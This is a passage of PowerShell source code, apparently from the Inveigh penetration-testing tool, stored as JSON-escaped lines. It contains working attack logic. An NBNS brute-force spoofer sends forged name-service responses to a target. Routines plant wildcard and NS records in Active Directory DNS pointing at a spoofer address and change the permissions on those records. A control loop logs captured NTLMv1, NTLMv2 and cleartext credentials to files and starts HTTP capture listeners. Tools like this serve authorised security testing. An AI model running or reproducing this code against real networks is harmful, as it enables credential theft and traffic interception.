","    $destination_IP = [System.Net.IPAddress]::Parse($NBNSBruteForceTarget)","    $destination_point = New-Object Net.IPEndpoint($destination_IP,137)","    $NBNS_bruteforce_UDP_client.Connect($destination_point)","       ","    while($inveigh.running)","    {","","        :NBNS_spoofer_loop while (!$inveigh.hostname_spoof -and $inveigh.running)","        {","","            if($NBNS_paused)","            {","                $inveigh.output_queue.Add(\"[*] [$(Get-Date -format s)] Resuming NBNS brute force spoofer\") \u003e $null","                $NBNS_paused = $false","            }","","            for ($i = 0; $i -lt 255; $i++)","            {","","                for ($j = 0; $j -lt 255; $j++)","                {","                    $NBNS_response_packet[0] = $i","                    $NBNS_response_packet[1] = $j                 ","                    $NBNS_bruteforce_UDP_client.send($NBNS_response_packet,$NBNS_response_packet.Length)","","                    if($inveigh.hostname_spoof -and $NBNSBruteForcePause)","                    {","                        $inveigh.output_queue.Add(\"[*] [$(Get-Date -format s)] Pausing NBNS brute force spoofer\") \u003e $null","                        $NBNS_paused = $true","                        break NBNS_spoofer_loop","                    }","                ","                }","            ","            }","        ","        }","","        Start-Sleep -m 5","    }","","    $NBNS_bruteforce_UDP_client.Close()","}","","# Control Loop ScriptBlock","$control_scriptblock =","{","    param ($ADIDNSACE,$ADIDNSCleanup,[System.Management.Automation.PSCredential]$ADIDNSCredential,$ADIDNSDomain,","        $ADIDNSDomainController,$ADIDNSForest,$ADIDNSHostsIgnore,$ADIDNSNS,$ADIDNSNSTarget,$ADIDNSPartition,","        $ADIDNSThreshold,$ADIDNSTTL,$ADIDNSZone,$ConsoleQueueLimit,$elevated_privilege,$NBNSBruteForcePause,","        $RunCount,$RunTime,$SpooferIP)","","    function Invoke-OutputQueueLoop","    {","","        while($inveigh.output_queue.Count -gt 0)","        {","            $inveigh.console_queue.Add($inveigh.output_queue[0]) \u003e $null","","            if($inveigh.file_output)","            {","                ","                if ($inveigh.output_queue[0].StartsWith(\"[+] \") -or $inveigh.output_queue[0].StartsWith(\"[*] \") -or $inveigh.output_queue[0].StartsWith(\"[!] \") -or $inveigh.output_queue[0].StartsWith(\"[-] \"))","                {","                    $inveigh.log_file_queue.Add($inveigh.output_queue[0]) \u003e $null","                }","                else","                {","                    $inveigh.log_file_queue.Add(\"[redacted]\") \u003e $null    ","                }","","            }","","            if($inveigh.log_output)","            {","                $inveigh.log.Add($inveigh.output_queue[0]) \u003e $null","            }","","            $inveigh.output_queue.RemoveAt(0)","        }","","    }","","    function Stop-InveighRunspace","    {","        param ([String]$Message)","        ","        if($inveigh.HTTPS -and !$inveigh.HTTPS_existing_certificate -or ($inveigh.HTTPS_existing_certificate -and $inveigh.HTTPS_force_certificate_delete))","        {","","            try","            {","                $certificate_store = New-Object System.Security.Cryptography.X509Certificates.X509Store(\"My\",\"LocalMachine\")","                $certificate_store.Open('ReadWrite')","                $certificates = (Get-ChildItem Cert:\\LocalMachine\\My | Where-Object {$_.Issuer -Like \"CN=\" + $inveigh.certificate_issuer})","","                foreach($certificate in $certificates)","                {","                    $certificate_store.Remove($certificate)","                }","","                $certificate_store.Close()","            }","            catch","            {","                $inveigh.output_queue.Add(\"[-] [$(Get-Date -format s)] SSL Certificate Deletion Error [Remove Manually]\") \u003e $null","            }","","        }","","        if($ADIDNSCleanup -eq 'Y' -and $inveigh.ADIDNS_table.Count -gt 0)","        {","            [Array]$ADIDNS_table_keys_temp = $inveigh.ADIDNS_table.Keys","","            foreach($ADIDNS_host in $ADIDNS_table_keys_temp)","            {","                ","                if($inveigh.ADIDNS_table.$ADIDNS_host -ge 1)","                {","","                    try","                    {","                        Disable-ADIDNSNode -Credential $ADIDNSCredential -Domain $ADIDNSDomain -DomainController $ADIDNSDomainController -Node $ADIDNS_host -Partition $ADIDNSPartition -Zone $ADIDNSZone","                        $inveigh.ADIDNS_table.$ADIDNS_host = $null","                    }","                    catch","                    {","                        $error_message = $_.Exception.Message","                        $error_message = $error_message -replace \"`n\",\"\"","                        $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())\") \u003e $null","                        $inveigh.output_queue.Add(\"[-] [$(Get-Date -format s)] ADIDNS host record for $ADIDNS_host remove failed\") \u003e $null","                    }","","                }","","            }","","        }","        ","        if($inveigh.relay_running)","        {","            Start-Sleep -m 100","","            if($Message)","            {","                $inveigh.output_queue.Add(\"[*] [$(Get-Date -format s)] Inveigh Relay is exiting due to $Message\") \u003e $null","            }","            else","            {","                $inveigh.output_queue.Add(\"[*] [$(Get-Date -format s)] Inveigh Relay is exiting\") \u003e $null  ","            }","","            if(!$inveigh.running)","            {","                Invoke-OutputQueueLoop","                Start-Sleep -m 100","            }","","            $inveigh.relay_running = $false","        }","","        if($inveigh.running)","        {","","            if($Message)","            {","                $inveigh.output_queue.Add(\"[*] [$(Get-Date -format s)] Inveigh is exiting due to $Message\") \u003e $null","            }","            else","            {","                $inveigh.output_queue.Add(\"[*] [$(Get-Date -format s)] Inveigh is exiting\") \u003e $null  ","            }","","            Invoke-OutputQueueLoop","","            if(!$elevated_privilege)","            {","                Start-Sleep -s 3","            }","","            $inveigh.running = $false","        }","","        $inveigh.ADIDNS = $null","        $inveigh.HTTPS = $false","    }","","    if($inveigh.ADIDNS -contains 'Wildcard')","    {","        Invoke-ADIDNSSpoofer -Credential $ADIDNSCredential -Data $SpooferIP -Domain $ADIDNSDomain -DomainController $ADIDNSDomainController -Forest $ADIDNSForest -Node '*' -Partition $ADIDNSPartition -Type 'A'-TTL $ADIDNSTTL -Zone $ADIDNSZone","    }","","    if($inveigh.ADIDNS -contains 'NS')","    {","","        if($ADIDNSNSTarget.EndsWith($ADIDNSZone))","        {","            $NS_data = $ADIDNSNSTarget","            $ADIDNSNSTarget = $ADIDNSNSTarget -replace \".$ADIDNSZone\",''","        }","        else","        {","            $NS_data = $ADIDNSNSTarget + \".\" + $ADIDNSZone","        }","","        Invoke-ADIDNSSpoofer -Credential $ADIDNSCredential -Data $SpooferIP -Domain $ADIDNSDomain -DomainController $ADIDNSDomainController -Forest $ADIDNSForest -Node $ADIDNSNSTarget -Partition $ADIDNSPartition -Type 'A' -TTL $ADIDNSTTL -Zone $ADIDNSZone","        Invoke-ADIDNSSpoofer -Credential $ADIDNSCredential -Data $NS_data -Domain $ADIDNSDomain -DomainController $ADIDNSDomainController -Forest $ADIDNSForest -Node $ADIDNSNS -Partition $ADIDNSPartition -Type 'NS' -TTL $ADIDNSTTL -Zone $ADIDNSZone","    }","","    if($NBNSBruteForcePause)","    {   ","        $NBNS_pause = New-TimeSpan -Seconds $NBNSBruteForcePause","    }","","    $run_count_NTLMv1 = $RunCount + $inveigh.NTLMv1_list.Count","    $run_count_NTLMv2 = $RunCount + $inveigh.NTLMv2_list.Count","    $run_count_cleartext = $RunCount + $inveigh.cleartext_list.Count","","    if($RunTime)","    {    ","        $control_timeout = New-TimeSpan -Minutes $RunTime","        $control_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()","    }","","    while($inveigh.running)","    {","","        if($NBNSBruteForcePause -and $inveigh.hostname_spoof)","        {","         ","            if($inveigh.NBNS_stopwatch.Elapsed -ge $NBNS_pause)","            {","                $inveigh.hostname_spoof = $false","            }","        ","        }","","        if($RunCount)","        {","            ","            if($inveigh.NTLMv1_list.Count -ge $run_count_NTLMv1 -or $inveigh.NTLMv2_list.Count -ge $run_count_NTLMv2 -or $inveigh.cleartext_list.Count -ge $run_count_cleartext)","            {","                Stop-InveighRunspace \"reaching run count\"           ","            }","","        }","","        if($RunTime)","        {","","            if($control_stopwatch.Elapsed -ge $control_timeout)","            {","                Stop-InveighRunspace \"reaching run time\"","            }","","        }","","        if($inveigh.ADIDNS -contains 'Combo' -and $inveigh.request_table_updated)","        {","            ","            try","            {","                Invoke-ADIDNSCheck -Credential $ADIDNSCredential -Data $SpooferIP -Domain $ADIDNSDomain -DomainController $ADIDNSDomainController -Forest $ADIDNSForest -Ignore $ADIDNSHostsIgnore -Partition $ADIDNSPartition -RequestTable $inveigh.request_table -Threshold $ADIDNSThreshold -TTL $ADIDNSTTL -Zone $ADIDNSZone","            }","            catch","            {","                $error_message = $_.Exception.Message","                $error_message = $error_message -replace \"`n\",\"\"","                $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())\") \u003e $null","            }","","            $inveigh.request_table_updated = $false","        }","","        if($inveigh.ADIDNS -and $inveigh.ADIDNS_table.Count -gt 0)","        {","            [Array]$ADIDNS_table_keys_temp = $inveigh.ADIDNS_table.Keys","","            foreach($ADIDNS_host in $ADIDNS_table_keys_temp)","            {","                ","                if($inveigh.ADIDNS_table.$ADIDNS_host -eq 1)","                {","","                    try","                    {","                        Grant-ADIDNSPermission -Credential $ADIDNSCredential -Domain $ADIDNSDomain -DomainController $ADIDNSDomainController -Node $ADIDNS_host -Principal 'Authenticated Users'-Zone $ADIDNSZone","                        $inveigh.ADIDNS_table.$ADIDNS_host = 2","                    }","                    catch","                    {","                        $error_message = $_.Exception.Message","                        $error_message = $error_message -replace \"`n\",\"\"","                        $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())\") \u003e $null","                        $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] ADIDNS ACE add for host record for $ADIDNS_host failed\") \u003e $null","                    }","","                }","","            }","","        }","","        if($inveigh.file_output)","        {","","            while($inveigh.log_file_queue.Count -gt 0)","            {","                $inveigh.log_file_queue[0]|Out-File $inveigh.log_out_file -Append","                $inveigh.log_file_queue.RemoveAt(0)","            }","","            while($inveigh.NTLMv1_file_queue.Count -gt 0)","            {","                $inveigh.NTLMv1_file_queue[0]|Out-File $inveigh.NTLMv1_out_file -Append","                $inveigh.NTLMv1_file_queue.RemoveAt(0)","            }","","            while($inveigh.NTLMv2_file_queue.Count -gt 0)","            {","                $inveigh.NTLMv2_file_queue[0]|Out-File $inveigh.NTLMv2_out_file -Append","                $inveigh.NTLMv2_file_queue.RemoveAt(0)","            }","","            while($inveigh.cleartext_file_queue.Count -gt 0)","            {","                $inveigh.cleartext_file_queue[0]|Out-File $inveigh.cleartext_out_file -Append","                $inveigh.cleartext_file_queue.RemoveAt(0)","            }","","            while($inveigh.POST_request_file_queue.Count -gt 0)","            {","                $inveigh.POST_request_file_queue[0]|Out-File $inveigh.POST_request_out_file -Append","                $inveigh.POST_request_file_queue.RemoveAt(0)","            }","","        }","","        if(!$inveigh.console_output -and $ConsoleQueueLimit -ge 0)","        {","","            while($inveigh.console_queue.Count -gt $ConsoleQueueLimit -and !$inveigh.console_output)","            {","                $inveigh.console_queue.RemoveAt(0)","            }","","        }","","        if(!$inveigh.status_output)","        {","            Invoke-OutputQueueLoop","        }","","        Start-Sleep -m 5","        ","        if($inveigh.stop)","        {","            $inveigh.console_queue.Clear()","            Stop-InveighRunspace","        }","","    }","","}","","#endregion","#region begin startup functions","","# HTTP Listener Startup Function ","function HTTPListener","{","    $proxy_listener = $false","    $HTTPS_listener = $false","    $HTTP_runspace = [RunspaceFactory]::CreateRunspace()","    $HTTP_runspace.Open()","    $HTTP_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)","    $HTTP_powershell = [PowerShell]::Create()","    $HTTP_powershell.Runspace = $HTTP_runspace","    $HTTP_powershell.AddScript($shared_basic_functions_scriptblock) \u003e $null","    $HTTP_powershell.AddScript($NTLM_functions_scriptblock) \u003e $null","    $HTTP_powershell.AddScript($kerberos_functions_scriptblock) \u003e $null","    $HTTP_powershell.AddScript($HTTP_scriptblock).AddArgument($Challenge).AddArgument($Kerberos).AddArgument(","        $KerberosCount).A